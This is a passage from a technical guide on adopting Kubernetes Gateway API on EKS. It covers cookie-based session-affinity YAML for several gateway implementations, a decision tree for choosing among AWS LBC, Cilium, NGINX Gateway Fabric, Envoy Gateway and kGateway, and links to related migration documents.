spec:
  targetRefs:
    - group: gateway.networking.k8s.io
      kind: HTTPRoute
      name: api-route
  loadBalancer:
    type: ConsistentHash
    consistentHash:
      type: Cookie
      cookie:
        name: SESSION_COOKIE
        ttl: 3600s
```

</TabItem>
<TabItem value="kgateway" label="kGateway">

```yaml
apiVersion: gateway.kgateway.io/v1alpha1
kind: RouteOption
metadata:
  name: session-affinity
  namespace: production
spec:
  targetRefs:
    - group: gateway.networking.k8s.io
      kind: HTTPRoute
      name: api-route
  sessionAffinity:
    cookieBased:
      cookie:
        name: SESSION_COOKIE
        ttl: 3600s
```

</TabItem>
</Tabs>

### 4.7 Route Selection Decision Tree

Use the following decision tree to select the optimal solution for your organization.

```mermaid
flowchart TD
    start([Start Migration]) --> q1{Is AWS service<br/>integration critical?}

    q1 -->|Yes| q2{Need minimal<br/>operational overhead?}
    q1 -->|No| q3{Planning<br/>service mesh?}

    q2 -->|Yes| aws["✅ AWS Native<br/>(LBC v3 + ALB)"]
    q2 -->|No| q4{Need high-performance<br/>eBPF?}

    q4 -->|Yes| cilium["✅ Cilium<br/>Gateway API"]
    q4 -->|No| aws

    q3 -->|Yes| q5{AI/ML workload<br/>routing needed?}
    q3 -->|No| q6{Leverage NGINX<br/>experience?}

    q5 -->|Yes| kgw["✅ kGateway<br/>(CNCF Sandbox)"]
    q5 -->|No| q7{Planning<br/>Istio?}

    q7 -->|Yes| envoy["✅ Envoy Gateway"]
    q7 -->|No| cilium

    q6 -->|Yes| nginx["✅ NGINX Gateway<br/>Fabric"]
    q6 -->|No| envoy

    style start fill:#f5f5f5,stroke:#333
    style aws fill:#e6ffe6,stroke:#009900
    style cilium fill:#e6f3ff,stroke:#0066cc
    style nginx fill:#fff0e6,stroke:#cc6600
    style envoy fill:#ffe6e6,stroke:#cc0000
    style kgw fill:#f0e6ff,stroke:#6600cc
```



### 4.8 Scenario-Based Recommendations

The following are recommended solutions based on common organizational scenarios.

<ScenarioRecommendationTable locale="en" />

---

## 5. Benchmark Comparison Planning

A systematic benchmark is planned for objective performance comparison of 5 Gateway API implementations. Eight scenarios including throughput, latency, TLS performance, L7 routing, scaling, resource efficiency, failure recovery, and gRPC will be measured in identical EKS environments.

:::info Detailed Benchmark Plan
For test environment design, detailed scenarios, measurement metrics, and execution plan, see **[Gateway API Implementation Performance Benchmark Plan](/docs/benchmarks/gateway-api-benchmark)**.
:::

---

## 6. Conclusion and Future Roadmap

### 6.1 Conclusion

<RouteRecommendationTable locale="en" />

Select the solution that best fits your organization based on the table above.

<Tabs>
<TabItem value="aws" label="AWS All-In" default>

**AWS Native (LBC v3)** — Minimal operational overhead, managed ALB/NLB, SLA guaranteed, AWS WAF/Shield/ACM integration. Best for AWS-only environments prioritizing stability over performance.

</TabItem>
<TabItem value="cilium" label="High Performance">

**Cilium Gateway API** — Ultra-low latency (P99 under 10ms), eBPF networking, Hubble L7 observability, ENI mode VPC-native integration. Best for high-performance and service mesh environments.

</TabItem>
<TabItem value="nginx" label="NGINX Experience">

**NGINX Gateway Fabric** — Leverage existing NGINX knowledge, proven stability, F5 enterprise support, multi-cloud. Best for teams with NGINX experience needing fast migration.

</TabItem>
<TabItem value="envoy" label="CNCF Standard">

**Envoy Gateway** — CNCF standard, Istio compatible, rich L7 features (mTLS, ExtAuth, Rate Limiting, Circuit Breaking). Best for environments planning service mesh expansion.

</TabItem>
<TabItem value="kgateway" label="AI/ML Integration">

**kGateway** — Unified gateway (API+mesh+AI+MCP), AI/ML workload routing, Solo.io enterprise support. Best for environments needing specialized AI/ML routing.

</TabItem>
<TabItem value="hybrid" label="Hybrid Nodes">

**Cilium Gateway API + llm-d** — When integrating cloud and on-premises GPU nodes with EKS Hybrid Nodes, using Cilium as a unified CNI provides CNI unification + Hubble integrated observability + built-in Gateway API. AI inference traffic is optimized by llm-d with KV Cache-aware routing. See [Cilium ENI + Gateway API Advanced Guide](/docs/infrastructure-optimization/gateway-api-adoption-guide/cilium-eni-gateway-api#7-hybrid-node-architecture-and-aiml-workloads) for details.

</TabItem>
</Tabs>

### 6.2 Future Expansion Roadmap

<RoadmapTimeline locale="en" />

### 6.3 Key Message

:::info
**Complete migration before March 2026 NGINX Ingress EOL to eliminate security threats at the source.**

Gateway API is not just an Ingress replacement, but the future of cloud-native traffic management.
- **Role Separation**: Clear separation of responsibilities between platform and development teams
- **Standardization**: Portable configuration without vendor lock-in
- **Extensibility**: Expansion to East-West, service mesh, and AI integration
:::

**Start Now:**
1. Collect current Ingress inventory (Migration Execution Strategy document)
2. Select solution matching your workload (Section 6.1)
3. Build PoC environment (Migration Execution Strategy document)
4. Execute gradual migration (Migration Execution Strategy document)

---

## Related Documents

### Sub-Documents (Advanced Guides)

In-depth coverage of specific topics is provided in separate sub-documents.

- **[1. GAMMA Initiative — The Future of Service Mesh Integration](/docs/infrastructure-optimization/gateway-api-adoption-guide/gamma-initiative)** — GAMMA overview, East-West traffic management, service mesh integration architecture, implementation support status
- **[2. Cilium ENI Mode + Gateway API Advanced Configuration](/docs/infrastructure-optimization/gateway-api-adoption-guide/cilium-eni-gateway-api)** — ENI mode architecture, installation/configuration, performance optimization (eBPF, XDP), Hubble observability, BGP Control Plane v2, hybrid node architecture
- **[3. Migration Execution Strategy](/docs/infrastructure-optimization/gateway-api-adoption-guide/migration-execution-strategy)** — 5-Phase migration process, CRD installation, validation scripts, troubleshooting guide

### Related Categories

- [2. CoreDNS Monitoring & Optimization](/docs/infrastructure-optimization/coredns-monitoring-optimization)
- [3. East-West Traffic Optimization](/docs/infrastructure-optimization/east-west-traffic-best-practice)
- [4. Karpenter Ultra-Fast Autoscaling](/docs/infrastructure-optimization/karpenter-autoscaling)

### External References

- [Kubernetes Gateway API Official Documentation](https://gateway-api.sigs.k8s.io/)
- [AWS Load Balancer Controller](https://kubernetes-sigs.github.io/aws-load-balancer-controller/)
- [Cilium Gateway API Documentation](https://docs.cilium.io/en/stable/network/servicemesh/gateway-api/gateway-api/)
